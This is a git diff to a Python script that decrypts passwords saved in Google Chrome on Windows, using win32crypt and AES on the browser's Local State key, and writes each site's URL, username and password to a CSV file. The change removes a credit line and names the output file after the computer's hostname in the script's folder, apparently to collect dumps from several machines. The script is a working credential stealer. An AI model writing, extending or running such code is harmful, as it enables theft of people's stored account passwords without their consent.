@@ -1,4 +1,3 @@
-#Full Credits to LimerBoy
 import os
 import re
 import sys
@@ -9,6 +8,7 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+import socket
 
 #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
@@ -62,11 +62,21 @@ def get_db_connection(chrome_path_login_db):
         print("%s"%str(e))
         print("[ERR] Chrome database cannot be found")
         return None
-        
+
 if __name__ == '__main__':
     try:
+        # Get the script directory
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+
+        # Get the computer name
+        computer_name = socket.gethostname()
+
+        # Set the CSV file path
+        csv_filename = f'decrypted_password_{computer_name}.csv'
+        csv_path = os.path.join(script_dir, csv_filename)
+
         #Create Dataframe to store passwords
-        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
+        with open(csv_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
